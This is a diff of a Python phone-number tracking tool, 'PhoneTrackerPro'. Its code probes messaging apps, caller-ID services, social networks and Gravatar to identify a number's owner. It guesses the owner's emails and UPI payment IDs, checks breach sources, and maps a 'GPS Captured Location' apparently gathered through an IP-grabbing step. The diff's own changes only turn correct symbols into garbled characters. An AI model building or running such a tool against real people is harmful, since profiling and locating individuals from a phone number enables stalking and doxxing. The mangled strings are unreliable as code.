+        console.print(Panel("[bold cyan]PHASE 5: OSINT ÔÇö PLATFORM INTELLIGENCE[/bold cyan]", border_style="cyan"))
         probes = [
             ("WhatsApp", self._probe_whatsapp),
             ("Telegram", self._probe_telegram),
@@ -1580,7 +1580,7 @@ for all supported devices.</p>
             resp = session.get(url, timeout=8, allow_redirects=False)
             if resp.status_code in [200, 301, 302]:
                 self.osint_results["whatsapp"] = {"registered": True, "url": f"https://wa.me/{full}", "status": "Likely registered"}
-                console.print("[green]  ✓ WhatsApp: Likely registered[/green]")
+                console.print("[green]  Ô£ô WhatsApp: Likely registered[/green]")
             else:
                 self.osint_results["whatsapp"] = {"registered": False, "status": "Not found"}
                 console.print("[dim]  WhatsApp: Not detected[/dim]")
@@ -1595,7 +1595,7 @@ for all supported devices.</p>
             resp = session.get(url, timeout=8)
             if resp.status_code == 200 and "tgme_page" in resp.text:
                 self.osint_results["telegram"] = {"registered": True, "status": "Profile found"}
-                console.print("[green]  ✓ Telegram: Profile detected[/green]")
+                console.print("[green]  Ô£ô Telegram: Profile detected[/green]")
             else:
                 self.osint_results["telegram"] = {"registered": False, "status": "Not found"}
                 console.print("[dim]  Telegram: Not detected[/dim]")
@@ -1734,9 +1734,9 @@ for all supported devices.</p>
             if not self.owner_name or self.owner_name in ["", "Unknown"]:
                 self.owner_name = name
             self.osint_results["truecaller"] = result
-            console.print(f"[bold green]  ✓ Truecaller: {name}[/bold green]")
+            console.print(f"[bold green]  Ô£ô Truecaller: {name}[/bold green]")
             if email:
-                console.print(f"[bold green]  ✓ Truecaller Email: {email}[/bold green]")
+                console.print(f"[bold green]  Ô£ô Truecaller Email: {email}[/bold green]")
         else:
             self.osint_results["truecaller"] = {"found": False}
             console.print("[dim]  Truecaller: No public data (try Truecaller app for manual lookup)[/dim]")
@@ -1749,7 +1749,7 @@ for all supported devices.</p>
             resp = session.get(url, timeout=8)
             if resp.status_code == 200 and "profile" in resp.text.lower():
                 self.osint_results["eyecon"] = {"found": True, "status": "Profile exists"}
-                console.print("[green]  ✓ Eyecon: Profile detected[/green]")
+                console.print("[green]  Ô£ô Eyecon: Profile detected[/green]")
             else:
                 self.osint_results["eyecon"] = {"found": False}
                 console.print("[dim]  Eyecon: Not found[/dim]")
@@ -1772,7 +1772,7 @@ for all supported devices.</p>
                         self.osint_results["syncme"] = {"name": name, "found": True}
                         if not self.owner_name:
                             self.owner_name = name
-                        console.print(f"[green]  ✓ SyncMe: {name}[/green]")
+                        console.print(f"[green]  Ô£ô SyncMe: {name}[/green]")
                         return
             self.osint_results["syncme"] = {"found": False}
             console.print("[dim]  SyncMe: Not found[/dim]")
@@ -1787,7 +1787,7 @@ for all supported devices.</p>
             resp = session.get(url, timeout=8, allow_redirects=False)
             if resp.status_code in [200, 302]:
                 self.osint_results["facebook"] = {"found": True, "status": "Account may exist"}
-                console.print("[green]  ✓ Facebook: Account indicator found[/green]")
+                console.print("[green]  Ô£ô Facebook: Account indicator found[/green]")
             else:
                 self.osint_results["facebook"] = {"found": False}
                 console.print("[dim]  Facebook: No indicator[/dim]")
@@ -1806,7 +1806,7 @@ for all supported devices.</p>
                     data = resp.json()
                     if data.get("status") == "ok":
                         self.osint_results["instagram"] = {"found": True, "status": "Account exists"}
-                        console.print("[green]  ✓ Instagram: Account exists[/green]")
+                        console.print("[green]  Ô£ô Instagram: Account exists[/green]")
                         return
                 except:
                     pass
@@ -1835,7 +1835,7 @@ for all supported devices.</p>
                         mentions.append({"title": title.get_text(strip=True), "url": link.get("href", "")})
                 if mentions:
                     self.osint_results["google_mentions"] = mentions
-                    console.print(f"[green]  ✓ Google: {len(mentions)} mentions found[/green]")
+                    console.print(f"[green]  Ô£ô Google: {len(mentions)} mentions found[/green]")
                 else:
                     self.osint_results["google_mentions"] = []
                     console.print("[dim]  Google: No public mentions[/dim]")
@@ -1850,9 +1850,9 @@ for all supported devices.</p>
                          "@upi", "@axl", "@ibl", "@apl", "@pingpay"]
         possible_upis = [f"{nat}{suffix}" for suffix in upi_providers]
         self.osint_results["upi_possible"] = possible_upis
-        console.print(f"[green]  ✓ UPI: {len(possible_upis)} possible IDs generated[/green]")
+        console.print(f"[green]  Ô£ô UPI: {len(possible_upis)} possible IDs generated[/green]")
         for upi in possible_upis[:3]:
-            console.print(f"[dim]    → {upi}[/dim]")
+            console.print(f"[dim]    ÔåÆ {upi}[/dim]")
 
     def _probe_email_from_name(self):
         """Generate possible email addresses from owner name + phone number."""
@@ -1898,9 +1898,9 @@ for all supported devices.</p>
         self.osint_results["possible_emails"] = unique_emails
         self.osint_data["possible_emails"] = unique_emails
         if unique_emails:
-            console.print(f"[green]  ✓ Email Guess: {len(unique_emails)} possible emails generated[/green]")
+            console.print(f"[green]  Ô£ô Email Guess: {len(unique_emails)} possible emails generated[/green]")
             for em in unique_emails[:4]:
-                console.print(f"[dim]    → {em}[/dim]")
+                console.print(f"[dim]    ÔåÆ {em}[/dim]")
 
     def _probe_gravatar(self):
         """Check Gravatar for profile photo/name using email hashes."""
@@ -1929,7 +1929,7 @@ for all supported devices.</p>
                         if profile["display_name"]:
                             if not self.owner_name or self.owner_name in ["Unknown", ""]:
                                 self.owner_name = profile["display_name"]
-                            console.print(f"[bold green]  ✓ Gravatar: Name = {profile['display_name']} ({email})[/bold green]")
+                            console.print(f"[bold green]  Ô£ô Gravatar: Name = {profile['display_name']} ({email})[/bold green]")
                         found_profiles.append(profile)
             except:
                 pass
@@ -1963,7 +1963,7 @@ for all supported devices.</p>
                 }
                 self.osint_results["abstractapi_phone"] = result
                 if ab_location:
-                    console.print(f"[green]  ✓ AbstractAPI: {ab_location} | {ab_carrier} | {ab_type}[/green]")
+                    console.print(f"[green]  Ô£ô AbstractAPI: {ab_location} | {ab_carrier} | {ab_type}[/green]")
                 else:
                     console.print(f"[dim]  AbstractAPI: Validated, no extra location[/dim]")
         except Exception:
@@ -1973,7 +1973,7 @@ for all supported devices.</p>
         if not self.osint_results:
             console.print("[yellow]  No OSINT data collected.[/yellow]")
             return
-        table = Table(title="🔍 OSINT INTELLIGENCE", border_style="magenta", show_lines=True)
+        table = Table(title="­ƒöì OSINT INTELLIGENCE", border_style="magenta", show_lines=True)
         table.add_column("Platform", style="bold white", width=20)
         table.add_column("Status", style="white", width=15)
         table.add_column("Details", style="cyan", width=40)
@@ -2007,7 +2007,7 @@ for all supported devices.</p>
                 # Show Truecaller email inline if present
                 extra = ""
                 if platform == "truecaller" and data.get("email"):
-                    extra = f" | ✉ {data['email']}"
+                    extra = f" | Ô£ë {data['email']}"
                 table.add_row(platform.title(), status, (str(name)[:40] + extra) if extra else str(name)[:40])
         # Owner name row
         if self.owner_name:
@@ -2021,10 +2021,10 @@ for all supported devices.</p>
         console.print(table)
 
     # =====================================================================
-    # PART 6: DEEP OSINT — Spam, Breach, Web
+    # PART 6: DEEP OSINT ÔÇö Spam, Breach, Web
     # =====================================================================
     def run_deep_osint(self):
-        console.print(Panel("[bold cyan]PHASE 6: DEEP OSINT — ADVANCED RECON[/bold cyan]", border_style="cyan"))
+        console.print(Panel("[bold cyan]PHASE 6: DEEP OSINT ÔÇö ADVANCED RECON[/bold cyan]", border_style="cyan"))
         deep_probes = [
             ("Spam Databases", self._scrape_spamcalls),
             ("ShouldIAnswer", self._scrape_shouldianswer),
@@ -2060,10 +2060,10 @@ for all supported devices.</p>
                     pass
             if spam_reports:
                 self.deep_osint["spam_reports"] = spam_reports
-                console.print(f"[yellow]  ⚠ Spam: Flagged on {len(spam_reports)} database(s)[/yellow]")
+                console.print(f"[yellow]  ÔÜá Spam: Flagged on {len(spam_reports)} database(s)[/yellow]")
             else:
                 self.deep_osint["spam_reports"] = []
-                console.print("[green]  ✓ Spam: Clean — no spam reports found[/green]")
+                console.print("[green]  Ô£ô Spam: Clean ÔÇö no spam reports found[/green]")
         except Exception:
             pass
 
@@ -2083,7 +2083,7 @@ for all supported devices.</p>
                     "review_count": len(reviews),
                 }
                 self.deep_osint["shouldianswer"] = result
-                console.print(f"[green]  ✓ ShouldIAnswer: {result['review_count']} reviews[/green]")
+                console.print(f"[green]  Ô£ô ShouldIAnswer: {result['review_count']} reviews[/green]")
             else:
                 self.deep_osint["shouldianswer"] = {"found": False}
                 console.print("[dim]  ShouldIAnswer: No data[/dim]")
@@ -2111,10 +2111,10 @@ for all supported devices.</p>
                     pass
             if results:
                 self.deep_osint["breach_indicators"] = results
-                console.print(f"[red]  ⚠ Breach: Indicators on {len(results)} source(s)[/red]")
+                console.print(f"[red]  ÔÜá Breach: Indicators on {len(results)} source(s)[/red]")
             else:
                 self.deep_osint["breach_indicators"] = []
-                console.print("[green]  ✓ Breach: No indicators found[/green]")
+                console.print("[green]  Ô£ô Breach: No indicators found[/green]")
         except Exception:
             pass
 
@@ -2151,9 +2151,9 @@ for all supported devices.</p>
                     pass
             self.deep_osint["web_mentions"] = all_mentions
             if all_mentions:
-                console.print(f"[green]  ✓ Web: {len(all_mentions)} mention(s) found[/green]")
+                console.print(f"[green]  Ô£ô Web: {len(all_mentions)} mention(s) found[/green]")
                 for m in all_mentions[:2]:
-                    console.print(f"[dim]    → {m['title'][:50]}[/dim]")
+                    console.print(f"[dim]    ÔåÆ {m['title'][:50]}[/dim]")
             else:
                 console.print("[dim]  Web: No mentions found[/dim]")
         except Exception:
@@ -2189,7 +2189,7 @@ for all supported devices.</p>
             m = folium.Map(location=[lat, lon], zoom_start=12, tiles="OpenStreetMap")
             popup_html = f"""
             <div style='font-family:Arial;min-width:200px'>
-                <h3 style='color:#e74c3c'>📱 {self.phone_number}</h3>
+                <h3 style='color:#e74c3c'>­ƒô▒ {self.phone_number}</h3>
                 <b>SIM Location:</b> {self.basic_info.get('location','N/A')}<br>
                 <b>Live Location:</b> {self.live_location.get('city','N/A')}<br>
                 <b>Carrier:</b> {self.basic_info.get('carrier','N/A')}<br>
@@ -2211,7 +2211,7 @@ for all supported devices.</p>
                 gps_lon = self.ip_grab_results["gps_lon"]
                 gps_popup = f"""
                 <div style='font-family:Arial;min-width:200px'>
-                    <h3 style='color:#2ecc71'>📍 GPS Captured Location</h3>
+                    <h3 style='color:#2ecc71'>­ƒôì GPS Captured Location</h3>
                     <b>Lat:</b> {gps_lat}<br>
                     <b>Lon:</b> {gps_lon}<br>
                     <b>IP:</b> {self.ip_grab_results.get('ip','N/A')}<br>
@@ -2232,10 +2232,10 @@ for all supported devices.</p>
             filename = f"output/phone_map_{num}_{ts}.html"
             os.makedirs("output", exist_ok=True)
             m.save(filename)
-            console.print(f"[green]  ✓ Map saved: {filename}[/green]")
+            console.print(f"[green]  Ô£ô Map saved: {filename}[/green]")
             return filename
         except ImportError:
-            console.print("[yellow]  folium not installed — skipping map.[/yellow]")
+            console.print("[yellow]  folium not installed ÔÇö skipping map.[/yellow]")
             return None
         except Exception as e:
             console.print(f"[red]  Map error: {e}[/red]")
@@ -2466,7 +2466,7 @@ disclosure is prohibited under the Official Secrets Act, 1923 and IT Act, 2000 S
         os.makedirs("output", exist_ok=True)
         with open(filename, "w", encoding="utf-8") as f:
             json.dump(self.to_dict(), f, indent=2, ensure_ascii=False, default=str)
-        console.print(f"[green]  ✓ JSON Report: {filename}[/green]")
+        console.print(f"[green]  Ô£ô JSON Report: {filename}[/green]")
         return filename
 
     def generate_reports(self, no_map=False, no_report=False, json_only=False):
@@ -2491,9 +2491,9 @@ def _print_summary(tracker):
     cls_styles = {"UNCLASSIFIED": "green", "RESTRICTED": "yellow", "CONFIDENTIAL": "red", "SECRET": "bold red"}
     cls_style = cls_styles.get(tracker.classification, "yellow")
     console.print(Panel(
-        f"[bold {cls_style}]  {tracker.classification} — LAW ENFORCEMENT SENSITIVE  [/bold {cls_style}]",
+        f"[bold {cls_style}]  {tracker.classification} ÔÇö LAW ENFORCEMENT SENSITIVE  [/bold {cls_style}]",
         border_style=cls_style))
-    console.print(Panel("[bold white]📊 INTELLIGENCE SUMMARY[/bold white]", border_style="bright_white"))
+    console.print(Panel("[bold white]­ƒôè INTELLIGENCE SUMMARY[/bold white]", border_style="bright_white"))
     # Case metadata
     case_table = Table(border_style="dim", show_lines=True, title="[bold cyan]Case Information[/bold cyan]")
     case_table.add_column("Field", style="bold", width=25)
@@ -2521,7 +2521,7 @@ def _print_summary(tracker):
     live_norm = live_city.lower().replace("new ", "")
     sim_norm = sim_city.lower().replace("new ", "")
     if live_city and sim_city and live_norm != sim_norm and live_city != "N/A":
-        table.add_row("Roaming", "[bold red]YES — Different from SIM city[/bold red]")
+        table.add_row("Roaming", "[bold red]YES ÔÇö Different from SIM city[/bold red]")
     else:
         table.add_row("Roaming", "[green]No[/green]")
     table.add_row("API Votes", f"{len(tracker.all_votes)} sources")
@@ -2574,10 +2574,10 @@ def main():
     console.print(BANNER)
     parser = argparse.ArgumentParser(
         prog="phone_tracker.py",
-        description=f"PhoneTrackerPro v{VERSION} — Law Enforcement Grade Phone Intelligence System",
+        description=f"PhoneTrackerPro v{VERSION} ÔÇö Law Enforcement Grade Phone Intelligence System",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
-━━━━━━━━━━━━━━━━━━━ USAGE EXAMPLES ━━━━━━━━━━━━━━━━━━━━
+ÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöü USAGE EXAMPLES ÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöü
 
   FULL SCAN (all phases):
     python phone_tracker.py +919876543210
@@ -2653,12 +2653,12 @@ def main():
 
     # Check API keys
     api_status = []
-    api_status.append(("TRESTLE", "✓" if os.getenv("TRESTLE_API_KEY") else "✗"))
-    api_status.append(("NUMVERIFY", "✓" if os.getenv("NUMVERIFY_API_KEY") else "✗"))
-    api_status.append(("ABSTRACT", "✓" if os.getenv("ABSTRACT_API_KEY") else "✗"))
-    api_status.append(("IPINFO", "✓" if os.getenv("IPINFO_TOKEN") else "✗"))
-    api_status.append(("OPENCAGE", "✓" if os.getenv("OPENCAGE_API_KEY") else "✗"))
-    api_str = "  ".join([f"{'[green]' if s == '✓' else '[red]'}{n}: {s}{'[/green]' if s == '✓' else '[/red]'}" for n, s in api_status])
+    api_status.append(("TRESTLE", "Ô£ô" if os.getenv("TRESTLE_API_KEY") else "Ô£ù"))
+    api_status.append(("NUMVERIFY", "Ô£ô" if os.getenv("NUMVERIFY_API_KEY") else "Ô£ù"))
+    api_status.append(("ABSTRACT", "Ô£ô" if os.getenv("ABSTRACT_API_KEY") else "Ô£ù"))
+    api_status.append(("IPINFO", "Ô£ô" if os.getenv("IPINFO_TOKEN") else "Ô£ù"))
+    api_status.append(("OPENCAGE", "Ô£ô" if os.getenv("OPENCAGE_API_KEY") else "Ô£ù"))
+    api_str = "  ".join([f"{'[green]' if s == 'Ô£ô' else '[red]'}{n}: {s}{'[/green]' if s == 'Ô£ô' else '[/red]'}" for n, s in api_status])
 
     # Classification display
     cls_styles = {"UNCLASSIFIED": "green", "RESTRICTED": "yellow", "CONFIDENTIAL": "red", "SECRET": "bold red"}
@@ -2671,7 +2671,7 @@ def main():
         f"[bold white]Case:[/bold white] {args.case_id or 'Auto-generated'}  |  "
         f"[bold white]Officer:[/bold white] {args.officer or 'Not specified'}\n"
         f"  [bold white]Output:[/bold white] {args.output_dir}/",
-        title=f"[bold cyan]⚙ Scan Configuration[/bold cyan]",
+        title=f"[bold cyan]ÔÜÖ Scan Configuration[/bold cyan]",
         border_style="dim"))
 
     tracker = PhoneTrackerPro(args.phone)
@@ -2688,7 +2688,7 @@ def main():
     # Phase 1: Parse & Validate
     console.print()
     if not tracker.parse_number():
-        console.print("[red]  ✗ Invalid phone number. Exiting.[/red]")
+        console.print("[red]  Ô£ù Invalid phone number. Exiting.[/red]")
         sys.exit(1)
 
     # Phase 2: Basic Info
@@ -2699,7 +2699,7 @@ def main():
     tracker.detect_telecom_circle()
 
     if args.quick:
-        console.print(Panel("[yellow]  Quick mode — skipping advanced phases.[/yellow]", border_style="yellow"))
+        console.print(Panel("[yellow]  Quick mode ÔÇö skipping advanced phases.[/yellow]", border_style="yellow"))
         tracker.generate_reports(no_map=args.no_map, no_report=args.no_report, json_only=args.json_only)
         _print_summary(tracker)
         return
@@ -2736,7 +2736,7 @@ def main():
 
     console.print()
     console.print(Panel(
-        f"[bold green]  ✓ Intelligence collection complete![/bold green]\n"
+        f"[bold green]  Ô£ô Intelligence collection complete![/bold green]\n"
         f"  [dim]Case: {tracker.case_id}  |  Classification: {tracker.classification}[/dim]",
         border_style="green"))
     console.print()
